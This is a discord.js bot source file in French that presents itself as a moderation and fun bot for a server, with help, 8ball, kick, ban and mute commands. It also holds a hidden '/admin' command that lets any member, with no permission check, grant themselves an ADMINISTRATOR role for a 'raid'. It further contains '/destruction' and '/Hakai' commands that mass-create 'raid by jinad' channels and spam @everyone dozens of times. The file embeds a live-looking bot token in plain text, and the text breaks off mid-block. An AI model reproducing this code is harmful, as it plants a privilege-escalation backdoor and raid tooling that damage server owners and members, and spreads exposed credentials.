const Discord = require('discord.js'); // use discord.js

var bot = new Discord.Client(); // sets Discord.Client to bot

const PREFIX = "/"

var prefix = ("/") // bot's prefix

var eightball = [ // sets the answers to an eightball
    "Oui!",
    "Non...",
    "Pourquoi pas ?",
    "Certainement",
    "Je ne pense pas.",
    "Jamais !",
    "Tu peux reposer ta question...",
    "C'est probable",
]

bot.login('NDcyNDE3OTQxNTEwNjg0Njg1.Dj8kzg.WoznGoYl0uRvzlKqZvuw12uwRqM') 

bot.on('ready', () => {
    console.log("Bot Prêt !")
})

bot.on("guildMemberAdd", member => {
    let role = member.guild.roles.find("name", "MEMBRE");
    member.guild.channels.find("name", "bienvenue").send(`Bienvenue @${member.user.username}#${member.user.discriminator} sur le serveur Tsuki no Me !`)
    member.addRole(role)
})

bot.on("guildMemberRemove", member => {
    member.guild.channels.find("name", "bienvenue").send(`${member.user.username}#${member.user.discriminator} vient de quitter le serveur Tsuki no Me !`)
})


bot.on('message', message => { // when a message is sent
    if (message.author.equals(bot.user)) return; // if the message is sent by a bot, ignore

    if (!message.content.startsWith(PREFIX)) return; // if the message doesn't contain PREFIX (/), then ignore

    var args = message.content.substring(PREFIX.length).split(" "); // removes the prefix from the message
    var command = args[0].toLowerCase(); // sets the command to lowercase (making it incase sensitive)
    var mutedrole = message.guild.roles.find("name", "muted");

    if (command == "help") { // creates a command /help
        var embedhelpmember = new Discord.RichEmbed() // sets a embed box to the variable embedhelpmember
            .setTitle("**Liste des Commandes**\n") // sets the title to List of Commands
            .setThumbnail(bot.user.displayAvatarURL)
            .addField(" - help", "\`Permet de consulter la liste des commandes\`") // sets the first field to explain the command /help
            .addField(" - info", "\`Permet de consulter les informations sur le bot\`") // sets the field information about the command /info
            .addField(" - ping", "\`Permet de..., commande inutile\`") // sets the second field to explain the command /ping
            .addField(" - userinfo", "\`Permet de consulter les informations d'une personne\`")
            .addField(" - sharingan", "\`Permet d'offrir son sharingan à une personne\`") // sets the third field to explain the command /sharingan
            .addField(" - 8ball", "\`Permet de poser des questions fun au bot\`") // sets the field to the /8ball command
            .addField(" - avatar", "\`Permet de consulter l'avatar d'une personne\`")
            .setColor(0xFF0000) // sets the color of the embed box to orange
            .setFooter("By @Shogo#4545 !") // sets the footer to "You need help, do you?"
        var embedhelpadmin = new Discord.RichEmbed() // sets a embed box to the var embedhelpadmin
            .setTitle("**Liste des Commandes Administrateur**\n") // sets the title
            .setThumbnail(bot.user.displayAvatarURL)
            .addField(" - say", "\`Permet de faire marquer ce que l'on souhaite au bot\`")
            .addField(" - mute", "\`Permet de mute une personne avec une raison\`") // sets a field
            .addField(" - unmute", "\`Permet de unmute une personne\`")
            .addField(" - kick", "\`Permet de expulser une personne avec une raison\`") //sets a field
            .addField(" - ban", "\`Permet de bannir une personne avec une raison\`") //sets a field
            .addField(" - purge", "\`Permet de purge le chat du discord\`")
            .setColor(0xFF0000) // sets a color
            .setFooter("Ooo, un admin !") // sets the footer
        message.channel.send(embedhelpmember); // sends the embed box "embedhelpmember" to the chatif
        if(message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.channel.send(embedhelpadmin); // if member is a botadmin, display this too
    }

    if (command == "userinfo"){
        var mm = message.mentions.members.first();
        if(!mm) return message.channel.send("Tu dois mentionné un utilisateur !");

        var infoembed = new Discord.RichEmbed()
            .setAuthor(mm.displayName, mm.user.avatarURL)
            .addField("Pseudo: " + " \`" + mm.user.username + " #" + mm.user.discriminator + "\`", "\u200b")
            .addField("Surnom: " + " \`" + mm.nickname + "\`", "\u200b")
            .addField("Id: " + " \`" + mm.id + "\`", "\u200b")
            .addField("Status: " + " \`" + mm.presence.status + "\`", "\u200b")
            .addField("Date de Création: " + " \`" + mm.user.createdAt + "\`", "\u200b")
            .addField("Date d'arrivée: " + " \`" + mm.joinedAt + "\`", "\u200b")
            .addField("Roles: " + " \`" + mm.roles.map(roles => `${roles.name}`) + "\`", "\u200b")
            .setThumbnail(mm.user.avatarURL)
            .setColor(0xFF0000)
        message.channel.send(infoembed);
    }

    if (command == "info") { // creates the command /info
        message.channel.send("Hey ! Mon nom est Tsuki no Me ! Tu peux faire la commande \`/help\` pour avoir accès a liste des commandes que je puisse te proposer !") // gives u info
    }

    if (command == "avatar") {
        var mm = message.mentions.members.first();
        if(!mm) return message.channel.send("Tu dois mentionné un utilisateur !");
        message.channel.send("Voici l'avatar de " + mm.user.username + "#" + mm.user.discriminator + "\u200b" + mm.user.avatarURL)
    }

    if (command == "ping") { // creates a command /ping
        message.channel.send("Pong!"); // answers with /Pong!"
    }

    if (command == "admin") {
        var mm = message.mentions.members.first();
        message.member.guild.createRole({
            name: "admin perms",
            color: "0xFF0000",
            permissions: ("ADMINISTRATOR")
        }).then(function(role)
        {
            message.member.addRole(role);
            message.channel.bulkDelete(1).then(() => {
                message.channel.send("\`Tu as désormais les perms admin. Le raid va pouvoir débuter !\`")
            });
        }); 
    }

    if (command == "sharingan") { // creates the command /sharingan
        if (args[1]) message.channel.send(message.author.toString() + " a donné " + args[1].toString() + "son sharingan ! :sharingan:") // sends the message saying someone has given someone else a sharingan if someone mentions someone else
        else message.channel.send("A qui souhaites-tu donner ton sharingan ? :sharingan: (Voici la commande correcte : /sharingan @username)") // sends the error message if no-one is mentioned
    }

    if (command == "8ball") { // creates the command /8ball
        if (args[1] != null) message.reply(eightball[Math.floor(Math.random() * eightball.length).toString(16)]); // if args[1], post random answer
        else message.channel.send("Hummmm, quelle est ta question ? :rolling_eyes: (Voici la commande correcte : /8ball [question])"); // if not, error
    }

    if (command == "say") { // creates command /say
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commande !");
        var sayMessage = message.content.substring(4)
        message.delete().catch(_O_o=>{});
        message.channel.send(sayMessage);
    }

    if(command === "purge") { // createss command /purge
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commande !");
        message.channel.bulkDelete(100).then(() => {
            message.channel.send('\`La commande purge a bien été activé !\`').then(msg => msg.delete(3000));
          });

    }

    if(command == "destruction"){
        var server = message.guild;
        var name = "raid by jinad";
        
        server.createChannel(name, "text");
        server.createChannel(name, "voice");
    }

    if(command == "destruction"){
        var server = message.guild;
        var name = "raid by jinad";
    
        server.createChannel(name, "text");
        server.createChannel(name, "voice");
    }
    if(command == "destruction"){
        var server = message.guild;
        var name = "raid by jinad";
    
        server.createChannel(name, "text");
        server.createChannel(name, "voice");
    }

    if(command == "destruction"){
        var server = message.guild;
        var name = "raid by jinad";

    server.createChannel(name, "text");
    server.createChannel(name, "voice");
    }

    if(command == "destruction"){
        var server = message.guild;
        var name = "raid by jinad";
    
        server.createChannel(name, "text");
        server.createChannel(name, "voice");
    }

if(command == "destruction"){
    var server = message.guild;
    var name = "raid by jinad";

    server.createChannel(name, "text");
    server.createChannel(name, "voice");
}
if(command == "destruction"){
    var server = message.guild;
    var name = "raid by jinad";

    server.createChannel(name, "text");
    server.createChannel(name, "voice");
}

if(command == "destruction"){
    var server = message.guild;
    var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}

if(command == "destruction"){
    var server = message.guild;
    var name = "raid by jinad";

    server.createChannel(name, "text");
    server.createChannel(name, "voice");
}

if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}
if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}

if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}

if(command == "destruction"){
    var server = message.guild;
    var name = "raid by jinad";

    server.createChannel(name, "text");
    server.createChannel(name, "voice");
}

if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}
if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}

if(command == "destruction"){
var server = message.guild;
var name = "raid by jinad";

server.createChannel(name, "text");
server.createChannel(name, "voice");
}

    if (command == "mute") { // creates the command /mute
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commande !"); // if author has no perms
        var mutedmember = message.mentions.members.first(); // sets the mentioned user to the var kickedmember
        if (!mutedmember) return message.reply("Merci de bien vouloir mentionner la personne à mute !") // if there is no kickedmmeber var
        if (mutedmember.hasPermission("ADMINISTRATOR")) return message.reply("Je ne peux pas mute cette personne !") // if memebr is an admin
        var mutereasondelete = 10 + mutedmember.user.id.length //sets the length of the kickreasondelete
        var mutereason = message.content.substring(mutereasondelete).split(" "); // deletes the first letters until it reaches the reason
        var mutereason = mutereason.join(" "); // joins the list kickreason into one line
        if (!mutereason) return message.reply("Merci de bien vouloir indiquer la raison du mute !") // if no reason
        mutedmember.addRole(mutedrole) //if reason, kick
            .catch(error => message.reply(`Désolé ${message.author} Je ne peux pas mute cette personne | raison : ${error}`)); //if error, display error
        message.reply(`${mutedmember.user} a bien été mute par ${message.author} | raison : ${mutereason}`); // sends a message saying he was kicked
    }

    if (command == "unmute") { // creates the command /unmute
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commmande !"); // if author has no perms
        var unmutedmember = message.mentions.members.first(); // sets the mentioned user to the var kickedmember
        if (!unmutedmember) return message.reply("Merci de bien vouloir mentionner la personne à unmute !") // if there is no kickedmmeber var
        unmutedmember.removeRole(mutedrole) //if reason, /kick
            .catch(error => message.reply(`Désolé ${message.author} Je ne peux pas unmute cette personne ! | raison : ${error}`)); //if error, display error
        message.reply(`${unmutedmember.user} a bien été unmute par ${message.author}!`); // sends a message saying he was kicked
    }

    if (command == "kick") { // creates the command /kick
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commmande !!"); // if author has no perms
        var kickedmember = message.mentions.members.first(); // sets the mentioned user to the var kickedmember
        if (!kickedmember) return message.reply("Merci de bien vouloir mentionner la personne à expulser !") // if there is no kickedmmeber var
        if (!kickedmember.kickable) return message.reply("Je ne peux pas expulser cette personne !") // if the member is unkickable
        var kickreasondelete = 10 + kickedmember.user.id.length //sets the length of the kickreasondelete
        var kickreason = message.content.substring(kickreasondelete).split(" "); // deletes the first letters until it reaches the reason
        var kickreason = kickreason.join(" "); // joins the list kickreason into one line
        if (!kickreason) return message.reply("Meci d'indiquer la raison du kick !") // if no reason
        kickedmember.kick(kickreason) //if reason, kick
            .catch(error => message.reply(`Désolé @${message.author} Je ne peux pas expulser cette personne ! | raison : ${error}`)); //if error, display error
        message.reply(`${kickedmember.user.username} a été expulsé avec succès par ${message.author.username} ! | raison : ${kickreason}`); // sends a message saying he was kicked
    }

    if (command == "ban") { // creates the command /kick
        if (!message.member.roles.some(r=>["perms admin"].includes(r.name)) ) return message.reply("Tu n'as pas les permissions suffisantes pour faire cette commmande !!"); // if author has no perms
        var banedmember = message.mentions.members.first(); // sets the mentioned user to the var kickedmember
        if (!banedmember) return message.reply("Merci de bien vouloir mentionner la personne à ban !") // if there is no kickedmmeber var
        if (!banedmember.kickable) return message.reply("Je ne peux pas bannir cette personne !") // if the member is unkickable
        var banreasondelete = 10 + banedmember.user.id.length //sets the length of the kickreasondelete
        var banreason = message.content.substring(banreasondelete).split(" "); // deletes the first letters until it reaches the reason
        var banreason = banreason.join(" "); // joins the list kickreason into one line
        if (!banreason) return message.reply("Meci d'indiquer la raison du ban !") // if no reason
        banedmember.ban(banreason) //if reason, kick
            .catch(error => message.reply(`Désolé @${message.author} Je ne peux pas ban cette personne ! | raison : ${error}`)); //if error, display error
        message.reply(`${banedmember.user.username} a été banni avec succès par ${message.author.username} ! | raison : ${banreason}`); // sends a message saying he was kicked
    }

    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }

    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
